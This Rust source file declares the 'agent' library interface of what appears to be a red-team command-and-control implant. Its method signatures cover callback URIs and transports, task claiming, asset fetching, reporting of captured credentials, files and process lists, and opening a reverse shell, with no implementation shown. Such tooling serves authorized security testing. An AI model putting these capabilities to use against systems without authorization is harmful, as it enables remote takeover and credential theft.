#![allow(clippy::mutable_key_type)]
extern crate alloc;

use alloc::string::String;
use alloc::vec::Vec;
use eldritch_core::Value;
use eldritch_macros::{eldritch_library, eldritch_method};

use alloc::collections::BTreeMap;

#[cfg(feature = "fake_bindings")]
pub mod fake;

#[cfg(feature = "stdlib")]
pub mod agent;
#[cfg(feature = "stdlib")]
pub mod conversion;
#[cfg(feature = "stdlib")]
pub mod std;

#[cfg(not(feature = "stdlib"))]
pub mod conversion_fake;

#[cfg(feature = "stdlib")]
use conversion::*;

#[cfg(not(feature = "stdlib"))]
use conversion_fake::*;

// Re-export wrappers so modules can use them (but they are internal to crate if not pub)
// Wait, `conversion` and `conversion_fake` define public structs.
// We need to make sure they are accessible.

#[eldritch_library("agent")]
pub trait AgentLibrary {
    #[eldritch_method]
    fn get_config(&self) -> Result<BTreeMap<String, Value>, String>;

    #[eldritch_method]
    fn get_id(&self) -> Result<String, String>;

    #[eldritch_method]
    fn get_platform(&self) -> Result<String, String>;

    #[eldritch_method]
    fn _terminate_this_process_clowntown(&self) -> Result<(), String>;

    #[eldritch_method]
    fn set_config(&self, config: BTreeMap<String, Value>) -> Result<(), String>;

    #[eldritch_method]
    fn sleep(&self, secs: i64) -> Result<(), String>;

    #[eldritch_method]
    fn set_callback_interval(&self, interval: i64) -> Result<(), String>;

    #[eldritch_method]
    fn set_callback_uri(&self, uri: String) -> Result<(), String>;

    // Interactivity
    #[eldritch_method]
    fn fetch_asset(&self, name: String) -> Result<Vec<u8>, String>;

    #[eldritch_method]
    fn report_credential(&self, credential: CredentialWrapper) -> Result<(), String>;

    #[eldritch_method]
    fn report_file(&self, file: FileWrapper) -> Result<(), String>;

    #[eldritch_method]
    fn report_process_list(&self, list: ProcessListWrapper) -> Result<(), String>;

    #[eldritch_method]
    fn report_task_output(&self, output: String, error: Option<String>) -> Result<(), String>;

    #[eldritch_method]
    fn reverse_shell(&self) -> Result<(), String>;

    #[eldritch_method]
    fn claim_tasks(&self) -> Result<Vec<TaskWrapper>, String>;

    // Agent Configuration
    #[eldritch_method]
    fn get_transport(&self) -> Result<String, String>;

    #[eldritch_method]
    fn set_transport(&self, transport: String) -> Result<(), String>;

    #[eldritch_method]
    fn add_transport(&self, transport: String, config: String) -> Result<(), String>;

    #[eldritch_method]
    fn list_transports(&self) -> Result<Vec<String>, String>;

    #[eldritch_method]
    fn get_callback_interval(&self) -> Result<i64, String>; // i64 because Eldritch ints are i64

    // Task Management
    #[eldritch_method]
    fn list_tasks(&self) -> Result<Vec<TaskWrapper>, String>;

    #[eldritch_method]
    fn stop_task(&self, task_id: i64) -> Result<(), String>;
}
